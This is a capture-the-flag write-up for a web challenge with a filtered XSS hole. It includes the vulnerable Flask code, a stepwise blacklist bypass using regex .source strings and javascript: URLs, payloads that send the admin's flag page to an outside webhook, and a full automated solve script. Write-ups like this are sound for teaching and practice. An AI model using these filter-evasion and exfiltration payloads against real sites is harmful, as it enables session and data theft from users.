## stance  

<img src="images/chall.png" width=600>

We are given a webpage with an obvious XSS vuln.  

`/test` renders an XSS payload, while `/report` visits `/test` with an admin bot.  

```python
@app.route('/test', methods=['GET'])
@login_required
def test():
    payload = request.args.get('payload')

    if payload is None:
        return render_template('test.html', result=None, error=None, payload=None)

    for banned in banlist:
        if banned in payload:
            print(f"Banned term detected: {banned}")
            return render_template('test.html', result=None, error=f"Banned term detected: {banned}", payload=payload)

    cleaned = sanitize_input(payload)
    return render_template('test.html', result=cleaned, error=None, payload=payload)

@app.route('/report')
@login_required
def report():
    payload = request.args.get('payload')
    if payload is None:
        return render_template('report.html', message=None, payload=None)

    url = f'http://127.0.0.1:3000/test?payload={payload}'
    result = read_url(url)
    message = "Success" if result else "Fail"
    return render_template('report.html', message=message, payload=payload)
```

There is a separate `/flag` endpoint that can only be accessed by the admin bot.  

```python
@app.route('/flag')
@login_required
def flag():
    ip = request.remote_addr
    is_localhost = ip == '127.0.0.1'
    username = current_user()

    if is_localhost and username == 'admin':
        return render_template('flag.html', flag=FLAG, username=username)

    return render_template('flag.html', flag=None, username=username)
```

The backend uses `bleach` to sanitize our payload, but it whitelists `<script>`, so we don't have to do any element acrobatics to get XSS.  

```python
import bleach

ALLOWED_TAGS = ['script']   # still you are helpless!
ALLOWED_ATTRIBUTES = {}
ALLOWED_PROTOCOLS = ['http', 'https']

def sanitize_input(user_input: str) -> str:
    return bleach.clean(
        user_input,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
        strip_comments=True
    )
```

The more challenging security feature is the blacklist being enforced.  

`()\`` are blacklisted, which makes function invocation rather challenging.  

```python
banlist = [
    "`", "\"", "'", ";", "@", "!", "%", "(", ")", "!", "\\x", "alert", "fetch", "replace",
    "javascript", "location", "href", "window", "innerHTML", "src", "document", "cookie",
    "function", "constructor", "atob", "decodeURI", "decodeURIComponent", "escape", "unescape",
    "setTimeout", "xhr", "XMLHttpRequest", "origin", "this", "self", "proto", "prototype"
]
```

JavaScript allows code execution by reassigning the global `location` variable with a `javascript:` URL.  

This is huge, as it essentially allows us to dynamically execute JavaScript code. Since quotes are blacklisted, we can overcome this using regex.  

```js
location=/javascript:alert(1)/.source
```

A lot of keywords referencing the window such as `this`, `window` and `location` are blacklisted, but thankfully, we can still dynamically access `location` using the `top` variable.  

```js
top[/location/.source] =/javascript:alert(1)/.source
```

Now that we have a way of dynamically executing code, we need to obfuscate our payload.  

Our base payload requests `flag`, then slices the indexes of the flag and exfiltrates it to the webhook.  

```js
fetch(/flag/.source).then(r=>r.text()).then(d=>location.href=/<webhook>?exfil=/.source+d.slice(1128,1180))
```

As `bleach` is used to sanitize the payload, it will auto-escape `<>` and break the payload, so we have to use `await` statements instead.  

```js
async function f(){r=await fetch(/flag/.source),d=await r.text(),location.href=/<webhook>?exfil=/.source+d.slice(1128,1180)}f()
```

Since we can construct our main payload logic as a string to be executed, we need to find a way to construct `()/` dynamically to replace them in our payload string.  

For braces, we can coerce `eval` to a string and pull the characters from there.  

```js
e=eval+1    // 'function eval() { [native code] }1'

l=e[13]     // '('
r=e[14]     // ')'
```

For the forward slash, we can construct a regex containing `/` and access its index.  

```js
s=/\//.source[1]    // '/'
```

To fully bypass the blacklist, we can replace the blacklisted characters with our replacements above, and split up blacklisted keywords using the `//.source` technique from earlier.  

```js
e=eval+1,s=/\//.source[1],l=e[13],r=e[14],top[/loca/.source+/tion/.source]=/javas/.source+/cript:async func/.source+/tion f/.source+l+r+/{r=await fe/.source+/tch/.source+l+s+/flag/.source+s+/.source/.source+r+/,d=await r.text/.source+l+r+/,loca/.source+/tion.hr/.source+/ef=s+s+/.source+s+/ewdtmyp.request.dreamhack.games?exfil=/.source+s+/.source+d.slice/.source+l+/1128,1180/.source+r+/}f/.source+l+r
```

Requesting `/report` with our payload will exfiltrate the flag to our webhook.  

<img src="images/flag.png" width=800>

Below is my full solve script that auto-obfuscates and submits the payload.  

```python
import requests
from urllib.parse import quote

url = "http://host3.dreamhack.games:17656/"
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data={
    **creds,
    'confirm': creds['password']
})

res = s.post(f'{url}/login', data=creds)

print("> Logged in")

# xss
banlist = [
    "`", "\"", "'", ";", "@", "!", "%", "(", ")", "!", "\\x", "alert", "fetch", "replace",
    "javascript", "location", "href", "window", "innerHTML", "src", "document", "cookie",
    "function", "constructor", "atob", "decodeURI", "decodeURIComponent", "escape", "unescape",
    "setTimeout", "xhr", "XMLHttpRequest", "origin", "this", "self", "proto", "prototype"
]

def obf(payload):
    # constants
    consts = [
        'e=eval+1',
        r's=/\//.source[1]',    # forward slash
        'l=e[13]',              # left brace
        'r=e[14]'               # right brace
    ]

    # replace slashes
    payload = payload.split('/')
    payload = '/.source+s+/'.join(payload)

    # replace left braces
    payload = payload.split('(')
    payload = '/.source+l+/'.join(payload)
    
    # replace right braces
    payload = payload.split(')')
    payload = '/.source+r+/'.join(payload)

    payload = f'{','.join(consts)},top[/location/.source]=/javascript:{payload}/.source'

    # replace blacklist
    for ban in banlist:
        if ban in payload:
            mid = len(ban) // 2
            l, r = ban[:mid], ban[mid:]

            payload = payload.replace(ban, f'{l}/.source+/{r}')

    # scuffed asl
    payload = payload.replace("+//.source", '')

    return payload

webhook = "ewdtmyp.request.dreamhack.games"
payload = "async function f(){r=await fetch(/flag/.source),d=await r.text(),location.href=s+s+/%s?exfil=/.source+d.slice(1128,1180)}f()" % webhook
payload = obf(payload)

res = s.get(f'{url}/report', params={
    'payload': f'<script>{quote(payload)}</script>'
})

if "success" in res.text.lower():
    print("> Payload submitted")
```

Flag: `DH{Th1s_1s_r341_xss_insane_c9a1bf5bc3f2}`